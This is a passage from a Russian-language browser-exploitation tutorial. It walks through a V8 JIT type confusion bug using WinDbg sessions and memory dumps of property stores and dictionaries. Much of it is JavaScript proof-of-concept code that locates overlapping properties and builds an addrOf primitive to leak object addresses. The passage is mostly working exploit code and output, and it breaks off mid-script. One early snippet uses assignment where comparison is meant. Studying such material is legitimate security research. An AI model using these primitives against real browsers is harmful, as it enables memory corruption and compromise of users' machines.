\nRUNTIME_FUNCTION(Runtime_DebugPrint)\n в файле исходников \n/src/runtime/runtime-test.cc\n. Она сработает при вызове \n%DebugPrint\n. Это позволит отлаживать вывод d8 и выполнять дальнейший анализ эксплойта в WinDbg.\n\r\n\n\r\nДавайте начнём с изменения proof of concept, добавив в него команду \nDebugPrint\n до и после изменения объекта. Скрипт должен выглядеть вот так:\n\r\n\n\r\n\nfunction vuln(obj) {\n  // Выполняем доступ к свойству a объекта obj, что заставляет выполнить операцию CheckMap\n  obj.a;\n\n  // Принудительное преобразование Map при помощи побочного эффекта\n  Object.create(obj)\n\n  // Запуск type confusion при помощи доступа к внешнем свойству\n  return obj.b;\n}\n\nfor (let i = 0; i < 10000; i++) {\n  let obj = {a:42}; // Создание объекта с внутренними свойствами\n  obj.b = 43; // Сохраняем внешнее свойство в хранилище\n  if (i = 1) { %DebugPrint(obj); }\n  vuln(obj); // Вызываем type confusion\n  if (i = 9999) { %DebugPrint(obj); }\n\r\nЧтобы упростить анализ структуры памяти нашего объекта, мы изменим скрипт proof of concept так, чтобы он выводил информацию объекта в двух точках: в первый раз при итерации 1 после задания его свойств, второй раз при итерации 9999 после того, как срабатывает JIT и изменяет объект.\n\r\n\n\r\nДля отладки этого скрипта мы можем запустить d8 в WinDbg при помощи флага \n--allow-natives-syntax\n, за которым указывается местоположение скрипта proof of concept. Например:\n\r\n\n\r\n\n\r\nЗакончив с этим, нажмём \nDebug\n. Запустится d8 и дойдёт до первой точки отладки, установленной WinDbg.\n\r\n\n\r\n\n(17f0.155c): Break instruction exception - code 80000003 (first chance)\nntdll!LdrpDoDebuggerBreak+0x30:\n00007ffd`16220950 cc              int     3\n\r\nТеперь мы можем поискать функцию \nDebugPrint\n в исходном коде V8 при помощи команды \nx v8!*DebugPrint*\n внутри WinDbg. У вас должен получиться вывод похожий на показанный ниже.\n\r\n\n\r\n\n0:000> x v8!*DebugPrint*\n*** WARNING: Unable to verify checksum for C:\\dev\\v8\\v8\\out\\x64.debug\\v8.dll\n00007ffc`dc035ba0 v8!v8::internal::Runtime_DebugPrint (int, class v8::internal::Object **, class v8::internal::Isolate *)\n00007ffc`db99ef00 v8!v8::internal::ScopeIterator::DebugPrint (void)\n00007ffc`dc035f40 v8!v8::internal::__RT_impl_Runtime_DebugPrint (class v8::internal::Arguments *, class v8::internal::Isolate *)\n\r\nМы установим точку останова на функции \nv8!v8::internal::Runtime_DebugPrint\n. Это можно сделать, выполнив в WinDbg следующую команду.\n\r\n\n\r\n\nbp v8!v8::internal::Runtime_DebugPrint\n\r\nПосле настройки точки останова нажмите \nGo\n или введите \ng\n в окне команд, после чего мы должны будем перейти к точке останова \nDebugPrint\n.\n\r\n\n\r\n\n\r\nВы можете заметить, что, хотя произошёл переход к точке останова, в d8 нет вывода. Чтобы справиться с этим, мы можем установить точку останова в строке 542, щёлкнув на неё и нажав \nF9\n. Затем можно нажать \nShift + F11\n или «Step Out», чтобы продолжить исполнение, и просмотреть вывод отладки в d8.\n\r\n\n\r\n\nDebugPrint: 000000C44E40DAD9: [JS_OBJECT_TYPE]\n - map: 0x02a66658c251 <Map(HOLEY_ELEMENTS)> [FastProperties]\n - prototype: 0x00a318f04229 <Object map = 000002A6665822F1>\n - elements: 0x02c9f8782cf1 <FixedArray[0]> [HOLEY_ELEMENTS]\n - properties: 0x00c44e40db81 <PropertyArray[3]> {\n    #a: 42 (data field 0)\n    #b: 43 (data field 1) properties[0]\n }\n\r\nИзучив вывод, мы видим, что наш объект имеет одно внутреннее свойство и одно внешнее свойство, которое должно находиться в хранилище свойств по адресу \n0x00c44e40db81\n. Давайте взглянем на наш объект при помощи WinDbg, чтобы подтвердить этот адрес.\n\r\n\n\r\n\n0:000> dq 000000C44E40DAD9-1 L6\n000000c4`4e40dad8  000002a6`6658c251 000000c4`4e40db81\n000000c4`4e40dae8  000002c9`f8782cf1 0000002a`00000000\n000000c4`4e40daf8  000002c9`f8782341 00000005`00000000\n\r\nМы сразу же видим отличие. Хотя структура объекта соответствует адресу в выводе отладки, мы замечаем, что это полные 32-битные адреса. Причина в том, что в этой версии V8 ещё не реализовано сжатие указателей, поэтому V8 по-прежнему использует полный 32-битный адрес. В результате значения, хранящиеся в структуре объекта, больше не удваиваются. В этом можно убедиться, проверив, что шестнадцатеричное значение \n0x2a\n в десятеричном виде равно 42, что является значением первого внутреннего свойства.\n\r\n\n\r\nЗная это, давайте проверим структуру хранилища массива наших свойств, изучив содержимое памяти в WinDbg.\n\r\n\n\r\n\n0:000> dq 0x00c44e40db81-1 L6\n000000c4`4e40db80  000002c9`f8783899 00000003`00000000\n000000c4`4e40db90  0000002b`00000000 000002c9`f87825a1\n000000c4`4e40dba0  000002c9`f87825a1 deadbeed`beadbeef\n\r\nСделав это, видим, что свойство \nb\n (со значением 43 или \n0x2b\n в шестнадцатеричном виде) находится по смещению 16 массива в хранилище свойств.\n\r\n\n\r\nТеперь, когда мы проверили структуру нашего объекта, нажмём \nGo\n, а затем \nShift + F12\n, чтобы получить вывод модифицированного объекта после срабатывания бага.\n\r\n\n\r\n\nDebugPrint: 000000C44E40DAD9: [JS_OBJECT_TYPE]\n - map: 0x02a66658c2f1 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]\n - prototype: 0x00a318f04229 <Object map = 000002A6665822F1>\n - elements: 0x02c9f8782cf1 <FixedArray[0]> [HOLEY_ELEMENTS]\n - properties: 0x00c44e40dba9 <NameDictionary[29]> {\n   #a: 42 (data, dict_index: 1, attrs: [WEC])\n   #b: 43 (data, dict_index: 2, attrs: [WEC])\n }\n\r\nМы видим, что после срабатывания бага map объекта изменилась, а хранилище свойств было преобразовано в \nNamedDictionary\n размером 29. Проверив структуру объекта в WinDbg, мы убедимся, что адрес хранилища свойств теперь находится в \n0x00c44e40dba9\n.\n\r\n\n\r\n\n0:000> dq 000000C44E40DAD9-1 L6\n000000c4`4e40dad8  000002a6`6658c2f1 000000c4`4e40dba9\n000000c4`4e40dae8  000002c9`f8782cf1 00000000`00000000\n000000c4`4e40daf8  000002c9`f8782341 00000005`00000000\n\r\nТак и есть! Теперь рассмотрим структуру нашего словаря по адресу \n0x00c44e40dba9\n.\n\r\n\n\r\n\n0:000> dq 0x00c44e40dba9-1 L12\n000000c4`4e40dba8  000002c9`f8783669 0000001d`00000000\n000000c4`4e40dbb8  00000002`00000000 00000000`00000000\n000000c4`4e40dbc8  00000008`00000000 00000003`00000000\n000000c4`4e40dbd8  00000000`00000000 000002c9`f87825a1\n000000c4`4e40dbe8  000002c9`f87825a1 000002c9`f87825a1\n000000c4`4e40dbf8  000000a3`18f22049 0000002a`00000000\n000000c4`4e40dc08  000001c0`00000000 000002c9`f87825a1\n000000c4`4e40dc18  000002c9`f87825a1 000002c9`f87825a1\n000000c4`4e40dc28  000002c9`f87825a1 000002c9`f87825a1\n\r\nИзучив структуру словаря по этому адресу, мы видим, что она существенно отличается от структуры объекта \nFixedArray\n. Кроме того, мы видим, что значение второго свойства (43, или \n0x2b\n) находится в этой структуре по смещению 88, а значение нашего второго свойства 43, или \n0x2b\n отсутствует в ожидаемом месте. Вероятно, это значение расположено дальше в структуре памяти словаря.\n\r\n\n\r\nВозможно, вы задаётесь вопросом, что это за странные значения наподобие \n000002c9f87825a1\n в структуре словаря? На самом деле, словарь является \nHashMap\n, использующей хэш-таблицы для сопоставления ключа свойства с местом в хэш-таблице. Странное значение представляет собой \nхэш-код\n, ставший результатом применения хэш-функции к ключу.\n\r\n\n\r\nВ начале словаря мы видим, что Map объекта находится по смещению 0, длина словаря (29, или \n0x1d\n) находится по смещению 8, а количество элементов в словаре (2) — по смещению 16.\n\r\n\n\r\nВ данном случае, когда мы выполняем доступ к свойству \nb\n, V8 получает доступ к количеству элементов в словаре (которое должно быть равно 2, что подтверждается IR). При запуске этого кода в d8 после срабатывания бага он и в самом деле возвращает 2.\n\r\n\n\r\n\nd8> %OptimizeFunctionOnNextCall(vuln)\nd8> let obj = {a:42}; obj.b = 43; vuln(obj);\n2\n\r\nОтлично! Мы только что убедились, что наша уязвимость type confusion работает, и что у нас есть определённый контроль над тем, к какому типу данных мы можем получить доступ в словаре, указав свойство. Это позволит нам обойти словарь по 8 байтов на каждое свойство.\n\r\n\n\r\nТеперь вернёмся к обсуждению степени точности при попытках чтения и записи данных в объект. Как видите, имея два элемента, мы можем лишь прочитать количество элементов в словаре. На самом деле, это не особо полезно, поскольку обычно у нас нет контроля над этой частью структуры, ведь она распределяется автоматически.\n\r\n\n\r\nМы стремимся получить доступ на чтение и запись значений свойств в словаре, потому что тогда сможем легко считывать и записывать данные в значение свойства, просто указывая индекс свойств.\n\r\n\n\r\nКак мы уже видели, свойство, находящееся по смещению 16 в массиве, в словаре находится по смещению 88. Следовательно, если мы прибавим \n88/8=11\n разных свойств, то сможем читать и записывать наше первое свойство в словаре, выполняя доступ к свойству 10 из хранилища (которое должно находиться на глубине 88 байтов, или \n10x8+8\n внутри массива).\n\r\n\n\r\nЭто значит, что для каждых \nN\n свойств в \nFixedArray\n у нас будет достаточное количество пересекающихся свойств в словаре, находящихся по тому же смещению.\n\r\n\n\r\nЧтобы вам легче было это представить, ниже показан пример дампа памяти \nFixedArray\n с 11 свойствами и \nNameDictionary\n, имеющим пересекающееся свойство.\n\r\n\n\r\n\n   FixedArray                   NameDictionary\n000002c9`f8783899             000002c9`f8783669 \n0000000E`00000000             0000013F`00000000\n00000001`00000000             0000000B`00000000\n00000002`00000000             00000000`00000000\n00000003`00000000             00000008`00000000 \n00000004`00000000             00000003`00000000\n00000005`00000000             00000000`00000000\n00000006`00000000             000002c9`f87825a1\n00000007`00000000             000002c9`f87825a1\n00000008`00000000             000002c9`f87825a1\n00000009`00000000             000000a3`18f22049\n0000000A`00000000   <--!-->   00000001`00000000\n0000000B`00000000             000001c0`00000000\n\r\nКак видно из дампа памяти, при помощи доступа к свойству 10 из \nFixedArray\n мы можем получить доступ к значению свойства 1, выполнив баг и преобразовав \nFixedArray\n в \nNameDictionary\n. По сути, это позволит нам считывать и записывать значение свойства 1 в словаре.\n\r\n\n\r\nОднако у такого решения есть проблема: структура \nNameDictionary\n будет отличаться при каждом исполнении движка из-за распространяющейся на весь процесс случайности, используемой в механизме хэширования для таблиц hash map. В этом можно убедиться, заново запустив proof of concept и изучив структуру словаря после выполнения бага. У вас результаты могут быть другими, но я получил следующий вывод:\n\r\n\n\r\n\n0:000> dq 0x025e3e88dba9-1 L12\n0000025e`3e88dba8  0000028d`cdf03669 0000001d`00000000\n0000025e`3e88dbb8  00000002`00000000 00000000`00000000\n0000025e`3e88dbc8  00000008`00000000 00000003`00000000\n0000025e`3e88dbd8  00000000`00000000 00000305`8f922061\n0000025e`3e88dbe8  0000002b`00000000 000002c0`00000000\n0000025e`3e88dbf8  0000028d`cdf025a1 0000028d`cdf025a1\n0000025e`3e88dc08  0000028d`cdf025a1 0000028d`cdf025a1\n0000025e`3e88dc18  0000028d`cdf025a1 0000028d`cdf025a1\n0000025e`3e88dc28  0000028d`cdf025a1 0000028d`cdf025a1\n\r\nКак видите, свойство \nb\n (со значением 43, или \n0x2b\n) теперь находится по смещению 64 в словаре, а свойство \na\n отсутствует в ожидаемом месте. В данном случае, свойство \na\n на самом деле находится по смещению 184. Это значит, что наш предыдущий пример с использованием 11 свойств не сработает.\n\r\n\n\r\nХотя свойства не находятся в известном или хотя бы угадываемом порядке, мы всё равно знаем, что с большой вероятностью существует пара свойств \nP1\n и \nP2\n, которая рано или поздно пересечётся по одному и тому же смещению. Если мы сможем написать функцию JavaScript для поиска этих пересекающихся свойств, то, по крайней мере, сможем обеспечить какую-то степень точности в чтении и записи новых значений в эти свойства.\n\r\n\n\r\nПрежде чем писать эту функцию, нам нужно разобраться, сколько свойств необходимо сгенерировать, чтобы найти это пересечение. Из-за \nотслеживания резервов внутри объектов\n оптимальное количество быстрых свойств равно 32, поэтому используем это значение в качестве максимума.\n\r\n\n\r\nНачнём с изменения функциональности нашего proof of concept, создав новую функцию, создающую объект с одним внутренним и 32 внешними свойствами. Код для этой функции будет таким:\n\r\n\n\r\n\nfunction makeObj() {\n    let obj = {inline: 1234};\n    for (let i = 1; i < 32; i++) {\n        Object.defineProperty(obj, 'p' + i, {\n            writable: true,\n            value: -i\n        });\n    }\n    return obj;\n}\n\r\nСтоит отметить, что в функции мы используем отрицательное значение для \ni\n. Причина этого в том, что в словаре есть несколько несвязанных небольших положительных значений, например, длина и количество элементов. Если мы используем положительные значения для значений свойств, то есть вероятность получения ложноположительных результатов при поиске пересекающихся свойств, нужно использовать отрицательные числа, чтобы отличать наши свойства от несвязанных с ними значений.\n\r\n\n\r\nДалее можем начать писать функцию, которая будет искать пересекающиеся свойства. Одно изменение мы внесём в функцию \nvuln\n, которая раньше выполняла баг и возвращала свойство \nb\n объекта. В данном случае мы хотим возвращать значения всех свойств, чтобы можно было сравнивать их между массивом и словарём.\n\r\n\n\r\nДля этого можно использовать функцию \neval\n с \nшаблонными литералами\n, чтобы всего в нескольких строках кода генерировать все операторы возврата в среде исполнения. Сделать это позволяет следующий код:\n\r\n\n\r\n\nfunction findOverlappingProperties() {\n    // Создаём массив со всеми 32 именами свойств вида p1..p32\n    let pNames = [];\n    for (let i = 0; i < 32; i++) {\n        pNames[i] = 'p' + i;\n    }\n\n    // Создаём eval функции, которая будет генерировать код в среде исполнения\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      Object.create(obj);\n      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\\n')}\n      return [${pNames.join(', ')}];\n    }\n  `)\n}\n\r\nКраткое объяснение на случай, если вам непонятны последние две строки в функции \neval\n: мы используем здесь шаблонные литералы (обратные штрихи) и \nзаполнители\n, то есть встроенные выражения, разделённые символом доллара и фигурными скобками: \n${expression}\n. Когда мы вызываем функцию \nvuln\n в среде исполнения, эти выражения подвергаются \nстроковой интерполяции\n и выражение заменяется сгенерированной строкой.\n\r\n\n\r\nВ данном случае мы используем функцию \nmap\n для массива \npNames\n, чтобы создать новый массив строк, который будет приравниваться \nlet p1 = obj.p1\n. Это позволяет нам генерировать эти строки кода для задания и возврата значений всех свойств в среде исполнения, а не жёстко прописывать всё в коде.\n\r\n\n\r\nПример вывода d8 после функции \neval\n выглядит так:\n\r\n\n\r\n\nd8> let pNames = []; for (let i = 0; i < 32; i++) {pNames[i] = 'p' + i;}\n\"p31\"\nd8> pNames\n[\"p0\", \"p1\", \"p2\", \"p3\", \"p4\", \"p5\", \"p6\", \"p7\", \"p8\", \"p9\", \"p10\", \"p11\", \"p12\", \"p13\", \"p14\", \"p15\", \"p16\", \"p17\", \"p18\", \"p19\", \"p20\", \"p21\", \"p22\", \"p23\", \"p24\", \"p25\", \"p26\", \"p27\", \"p28\", \"p29\", \"p30\", \"p31\"]\nd8> pNames.map((p) => `let ${p} = obj.${p};`).join('\\n')\nlet p0 = obj.p0;\nlet p1 = obj.p1;\nlet p2 = obj.p2;\nlet p3 = obj.p3;\nlet p4 = obj.p4;\nlet p5 = obj.p5;\n...\n\r\nТеперь, когда у нас есть этот код и мы понимаем, как он работает, можно обновить скрипт proof of concept, добавив в него эти новые функции, а затем выполнить баг и вывести значения для массива и словаря. Обновлённый скрипт будет выглядеть так:\n\r\n\n\r\n\n// Создаём объект с одним внутренним и 32 внешними свойствами\nfunction makeObj() {\n    let obj = {inline: 1234};\n    for (let i = 1; i < 32; i++) {\n        Object.defineProperty(obj, 'p' + i, {\n            writable: true,\n            value: -i\n        });\n    }\n    return obj;\n}\n\n// Находим пару свойств, у которых p1 хранится по тому же смещению\n// в FixedArray, как и p2 в NameDictionary\nfunction findOverlappingProperties() {\n    // Создаём массив всех 32 имён функций вида p1..p32\n    let pNames = [];\n    for (let i = 0; i < 32; i++) {\n        pNames[i] = 'p' + i;\n    }\n\n    // Создаём eval нашей функции vuln, которая будет генерировать код в среде исполнения\n    eval(`\n    function vuln(obj) {\n      // Получаем встроенное свойство obj, что приводит к выполнению операции CheckMap\n      obj.inline;\n      // Принудительно выполняем Map Transition при помощи нашего побочного эффекта\n      this.Object.create(obj);\n      // Запускаем type confusion, получая доступ к свойствам за границами\n      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\\n')}\n      return [${pNames.join(', ')}];\n    }\n  `)\n\n    // JIT-код для запуска vuln\n    for (let i = 0; i < 10000; i++) {\n        let res = vuln(makeObj());\n        // Выводим FixedArray, если i=1, и Dictionary, если i=9999\n        if (i == 1 || i == 9999) {\n            print(res);\n        }\n    }\n}\n\nprint(\"[+] Finding Overlapping Properties\");\nfindOverlappingProperties();\n\r\nКогда мы запустим обновлённый скрипт в d8, то должны получить похожие результаты:\n\r\n\n\r\n\nC:\\dev\\v8\\v8\\out\\x64.debug>d8 C:\\Users\\User\\Desktop\\poc.js\n[+] Finding Overlapping Properties\n,-1,-2,-3,-4,-5,-6,-7,-8,-9,-10,-11,-12,-13,-14,-15,-16,-17,-18,-19,-20,-21,-22,-23,-24,-25,-26,-27,-28,-29,-30,-31\n,32,0,64,33,0,,,,p13,-13,3824,,,,p17,-17,4848,inline,1234,448,,,,p29,-29,7920,,,,p19,-19\n\r\nОтлично! Наша уязвимость type confusion работает, и мы можем выполнять утечку данных из словаря. Судя по выводу, мы видим, что есть несколько пересекающихся свойств, например, p10 пересекается с p13 (обратите внимание на отрицательные значения).\n\r\n\n\r\nТеперь, когда мы убедились, что этот код работает и пересекающиеся свойства существуют, можно изменить скрипт так, чтобы он перечислял результаты и выбирал пересекающееся свойство, значение которого меньше 0 и больше -32. Также давайте удалим свойства, которые пересекаются сами с собой.\n\r\n\n\r\nДополненный код будет выглядеть так:\n\r\n\n\r\n\n// Функция, создающая объект с одним внутренним и 32 внешними свойствами\nfunction makeObj() {\n    let obj = {inline: 1234};\n    for (let i = 1; i < 32; i++) {\n        Object.defineProperty(obj, 'p' + i, {\n            writable: true,\n            value: -i\n        });\n    }\n    return obj;\n}\n\n// Функция, находящая пару свойств, в которых p1 по тому же смещению\n// в FixedArray, что и p2 в NameDictionary\nlet p1, p2;\n\nfunction findOverlappingProperties() {\n    // Создаём массив из всех 32 имён свойств вида p1..p32\n    let pNames = [];\n    for (let i = 0; i < 32; i++) {\n        pNames[i] = 'p' + i;\n    }\n\n    // Создаём eval нашей функции vuln, которая будет генерировать код в среде исполнения\n    eval(`\n    function vuln(obj) {\n      // Получаем встроенное свойство obj, что приводит к выполнению операции CheckMap\n      obj.inline;\n      // Принудительно выполняем Map Transition при помощи нашего побочного эффекта\n      this.Object.create(obj);\n      // Запускаем type confusion, получая доступ к свойствам за границами\n      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\\n')}\n      return [${pNames.join(', ')}];\n    }\n  `)\n\n    // JIT-код для запуска vuln\n    for (let i = 0; i < 10000; i++) {\n        // Создаём объект и передаём его функции Vuln\n        let res = vuln(makeObj());\n        // Ищем в результатах пересекающиеся свойства\n        for (let i = 1; i < res.length; i++) {\n            // Если i является неодинаковым, а res[i] находится в интервале от -32 до 0, они пересекаются\n            if (i !== -res[i] && res[i] < 0 && res[i] > -32) {\n                [p1, p2] = [i, -res[i]];\n                return;\n            }\n        }\n    }\n    throw \"[!] Failed to find overlapping properties\";\n}\n\nprint(\"[+] Finding Overlapping Properties...\");\nfindOverlappingProperties();\nprint(`[+] Properties p${p1} and p${p2} overlap!`);\n\r\nЕсли мы снова запустим дополненный код в d8, то увидим, что можем стабильно находить пересекающиеся свойства.\n\r\n\n\r\n\nC:\\dev\\v8\\v8\\out\\x64.debug>d8 C:\\Users\\User\\Desktop\\poc.js\n[+] Finding Overlapping Properties...\n[+] Properties p7 and p12 overlap!\n\r\n\nРазбираемся с примитивами эксплойтинга браузеров\n\r\nИтак, теперь мы можем эксплойтить баг, чтобы запустить уязвимость type confusion. А еще выявили пересекающиеся свойства, которые можем использовать для чтения и записи данных. Внимательные читатели могли заметить, что пока мы можем читать только SMI и строки. По сути, простое считывание целых чисел или строк бесполезно, нам нужно найти способ читать и записывать указатели памяти.\n\r\n\n\r\nЧтобы достичь этого, нам нужно создать примитивы чтения и записи, называющиеся примитивами \naddrOf\n и \nfakeObj\n. Они позволят нам выполнять эксплойтинг пересекающихся свойств, выдавая объект одного типа за объект другого типа.\n\r\n\n\r\nДля создания таких примитивов мы можем использовать полученную type confusion и то, как Maps работает с устранением избыточности в JIT, создав нашу собственную глобальную уязвимость type confusion для любого произвольного значения на выбор!\n\r\n\n\r\nКак вы помните из первой и второй частей, мы обсуждали Map и BinaryOp, а также Feedback Lattice. Как мы знаем, Map хранят информацию о типах для свойств, а BinaryOp хранит потенциальные состояния типов для свойств во время JIT-компиляции.\n\r\n\n\r\nДля примера возьмём следующий код:\n\r\n\n\r\n\nfunction test(obj) {\n  return obj.b.x;\n}\n\nlet obj = {};\nobj.a = 13;\nobj.b = {x: 14};\n\r\nПосле исполнения этого кода в V8 Map объекта \nobj\n, покажет нам, что он имеет свойство \na\n, являющееся SMI, и свойство \nb\n, являющееся объектом со свойством \nx\n, также являющимся SMI.\n\r\n\n\r\nЕсли мы принудительно подвергнем эту функцию JIT, то проверка Map для \nb\n будет пропущена, поскольку будут сделаны спекулятивные предположения о том, что свойство \nb\n всегда будет объектом с конкретной Map, что позволяет устранению избыточности убрать проверку. Если эта информация о типах становится недействительной, например, при добавлении свойства или превращении значения в double, то распределяется новая Map, а в BinaryOp будет добавлена информация о типах для SMI и Double.\n\r\n\n\r\nБлагодаря этому становится возможным использовать этот сценарий вместе с нашими пересекающимися свойствами для создания мощного примитива эксплойта, который станет основой примитивов чтения и записи.\n\r\n\n\r\nПример этого кода с комментариями, который можно использовать как основу для примитивов, показан ниже.\n\r\n\n\r\n\neval(`\n  function vuln(obj) {\n    // Получаем встроенное свойство obj, что приводит к выполнению операции CheckMap\n    obj.inline;\n    // Принудительно выполняем Map Transition при помощи нашего побочного эффекта\n    this.Object.create(obj);\n    // Запускаем type confusion, получая доступ к свойствам за границами\n      // При этом будет загружено p1 из нашего объекта, считающееся ObjX, но вместо этого\n      // из-за бага и пересекающихся свойств будет загружено p2, то есть ObjY\n    let p = obj.${p1}.x;\n    return p;\n  }\n`)\n\nlet obj = makeObj();\nobj[p1] = {x: ObjX};\nobj[p2] = {y: ObjY};\nvuln(obj)\n\r\nКак видите, \np1\n и \np2\n — это пересекающиеся свойства после того, как наш массив был преобразован в словарь. Благодаря тому, что \np1\n присвоен Object X, а \np2\n присвоен Object Y, при JIT-компиляции функции \nvuln\n компилятор будет предполагать, что переменная \np\n будет иметь тип Object X, поскольку Map объекта \nobj\n опускает проверки типов.\n\r\n\n\r\nОднако из-за первоначальной уязвимости type confusion, которую мы эксплойтим, на самом деле код будет считывать свойство \np2\n и получать Object Y. В этом случае, движок будет представлять Object Y как Object X, вызывая ещё одну type confusion.\n\r\n\n\r\nБлагодаря использованию созданной нами глобальной type confusion, мы можем создавать примитивы чтения и записи, чтобы осуществлять утечку адресов объектов и выполнять запись в произвольные поля объектов.\n\r\n\n\r\n\nПримитив чтения addrOf\n\r\nНазвание примитива \naddrOf\n расшифровывается как «Address Of», и он работает в соответствии со своим названием. Он позволяет нам обеспечить утечку указателя адреса конкретного объекта при помощи созданной нами type confusion.\n\r\n\n\r\nКак показано в примере выше, мы можем создать глобальную уязвимость type confusion, воспользовавшись нашими пересекающимися свойствами и тем, как Map хранят информацию о типах, позволяя нам представить вывод Object Y как Object X. То есть вопрос заключается в том, как нам использовать этот сценарий, чтобы осуществить утечку адреса памяти.\n\r\n\n\r\nМы не можем просто передать два объекта и вернуть объект, поскольку они имеют одинаковый shape. Если мы это сделаем, то V8 просто разыменует объект и вернёт тип объекта или свойства объекта.\n\r\n\n\r\nНиже показан пример того, что мы увидим:\n\r\n\n\r\n\nC:\\dev\\v8\\v8\\out\\x64.debug>d8 --allow-natives-syntax C:\\Users\\User\\Desktop\\poc.js\n[+] Finding Overlapping Properties...\n[+] Properties p24 and p21 overlap!\n[+] Leaking Object Address...\n[+] Object Address: [object Object]\n\r\nКак видите, возвращаемое значение \n[object Object]\n для нас бесполезно. Вместо этого нам нужно вернуть объект, но в качестве другого типа.\n\r\n\n\r\nВ данном случае мы можем создать примитив чтения type confusion, сделав Object X Double! Таким образом, когда мы вызовем \np1\n, оно будет ожидать значение double, а поскольку \np1\n на самом деле возвращает \np2\n (являющееся указателем объекта), а не разыменовывает указатель, то оно вернёт его как число double с плавающей запятой!\n\r\n\n\r\nДавайте посмотрим на это в действии. Мы можем изменить приведённый выше пример кода, чтобы создать функцию \naddrOf\n, сменив Object X на double и оставив Object Y объектом.\n\r\n\n\r\nФункция будет выглядеть так:\n\r\n\n\r\n\nfunction addrOf() {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      return obj.p${p1}.x;\n    }\n  `);\n\n    let obj = makeObj()\n    obj[p1] = {x: 13.37};\n    obj[p2] = {y: obj};\n    vuln(obj); // Возвращает адрес obj как Double\n}\n\r\nКак видите, мы задали \np1\n как double со значением 13.37 и задали Object Y как объект, создаваемый из функции \nmakeObj\n.\n\r\n\n\r\nПосле запуска уязвимости через функцию \nvuln\n, движок предполагает, что возвращаемое \nobj.p1.x\n значение будет являться double, но вместо этого оно загрузит указатель в объект \np2\n и вернёт его как double.\n\r\n\n\r\nБлагодаря этому мы сможем организовать утечку адреса объектов, однако у нас есть небольшая проблема с функцией \nmakeObj\n. На данный момент функция \nmakeObj\n создаёт наш объект с одним внутренним и 32 внешними свойствами.\n\r\n\n\r\nКак вы можете помнить, все эти 32 внешних свойства являются отрицательными числами, которые мы использовали, чтобы избежать ложноположительных результатов при поиске пересекающихся свойств. Хотя это не вызывает сложностей, более серьёзная проблема заключается в том, что после нахождения пересекающихся свойств нам нужно иметь возможность модифицировать эти конкретные индексы свойств в хранилище нашего массива, чтобы при выполнении преобразования в словарь мы могли эксплойтить type confusion с точностью.\n\r\n\n\r\nНа данный момент это невозможно по причинам, объяснённым ниже.\n\r\n\n\r\nЕсли после создания нашего объекта мы попробуем изменять его свойства по конкретному индексу, они будут добавляться или в начало, или в конец массива свойств. Кроме того, мы не можем просто изменить именованное свойство через его имя \npN\n, поскольку оно не задано.\n\r\n\n\r\nПример этого показан ниже.\n\r\n\n\r\n\nd8> let obj = {p1:1, p2:2, p3:3};\nd8> obj[12] = 12;\nd8> obj\n{12: 12, p1: 1, p2: 2, p3: 3}\nd8> obj[p3] = 12\n(d8):1: ReferenceError: p3 is not defined\nobj[p3] = 12\n    ^\n\r\nЧтобы задавать наши объекты точно там, где нам нужно, необходимо создать массив свойств, который будет передаваться объекту при создании. Благодаря этому при помощи индекса из \np1\n и \np2\n мы сможем создать разреженный массив свойств, который позволит нам с точностью задавать объекты.\n\r\n\n\r\nПример этого показан ниже:\n\r\n\n\r\n\nd8> let obj = [];\nd8> obj[7] = 7;\nd8> obj[12] = 12;\nd8> obj\n[, , , , , , , 7, , , , , 12]\n\r\nДля этого изменим функцию \nmakeObj\n так, чтобы она принимала массив \npValues\n в качестве свойств и присваивала \npValues[i]\n как значение:\n\r\n\n\r\n\n// Функция, создающая объект с одним внутренним и 32 внешними свойствами\nfunction makeObj(pValues) {\n    let obj = {inline: 1234};\n    for (let i = 0; i < 32; i++) {\n        Object.defineProperty(obj, 'p' + i, {\n            writable: true,\n            value: pValues[i]\n        });\n    }\n    return obj;\n}\n\r\nСделав это, мы можем изменить функцию \naddrOf\n. Начнём с добавления нового массива \npValues\n, а затем присвоим \np1\n объект со значением double, а \np2\n присвоим специально созданный объект.\n\r\n\n\r\n\nfunction addrOf() {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      return obj.p${p1}.x;\n    }\n  `);\n\n    let obj = {z: 1234};\n    let pValues = [];\n    pValues[p1] = {x: 13.37};\n    pValues[p2] = {y: obj};\n\n    for (let i = 0; i < 10000; i++) {\n        let res = vuln(makeObj(pValues));\n        if (res != 13.37) {\n            %DebugPrint(obj);\n            return res;\n        }\n    }\n}\n\r\nКак видите, наш цикл JIT будет вызывать \nmakeObj\n для создания объекта со свойствами \np1\n и \np2\n, а затем передавать его функции \nvuln\n, чтобы запустить type confusion. Оператор \nif\n проверяет, не равны ли возвращаемые функцией \nvuln\n результаты 13.37. Если не равны, это значит, мы успешно запустили нашу type confusion и считали указатель адреса \nobj\n.\n\r\n\n\r\nПоскольку мы выполняем тестирование, я также добавил оператор \n%DebugPrint\n, чтобы выводить адрес \nobj\n. Это позволит нам удостовериться, что возвращаемые данные и в самом деле являются адресом.\n\r\n\n\r\nСкрипт эксплойта теперь выглядит, как показано ниже. Стоит заметить, что в этом тестовом случае я просто добавил вызов \naddrOf\n, который будет эксплойтить пересекающиеся свойства, чтобы осуществить утечку адреса объекта, жёстко заданного в функции.\n\r\n\n\r\nТакже обратите внимание на то, что я изменил функцию \nfindOverlappingProperties\n, добавив в неё массив \npValues\n для отрицательных значений. Это было сделано в поддержку изменения, внесённого в функцию \nmakeObj\n.\n\r\n\n\r\n\n// Функция, создающая объект с одним внутренним и 32 внешними свойствами\nfunction makeObj(pValues) {\n    let obj = {inline: 1234};\n    for (let i = 0; i < 32; i++) {\n        Object.defineProperty(obj, 'p' + i, {\n            writable: true,\n            value: pValues[i]\n        });\n    }\n    return obj;\n}\n// Функция, находящая пару свойств, в которых p1 по тому же смещению\n// в FixedArray, что и p2 в NameDictionary\nlet p1, p2;\n\nfunction findOverlappingProperties() {\n    // Создаём массив всех 32 имён свойств вида p1..p32\n    let pNames = [];\n    for (let i = 0; i < 32; i++) {\n        pNames[i] = 'p' + i;\n    }\n\n    // Создаём eval функции vuln, которая будет генерировать код в среде исполнения\n    eval(`\n    function vuln(obj) {\n      // Получаем встроенное свойство obj, что приводит к выполнению операции CheckMap\n      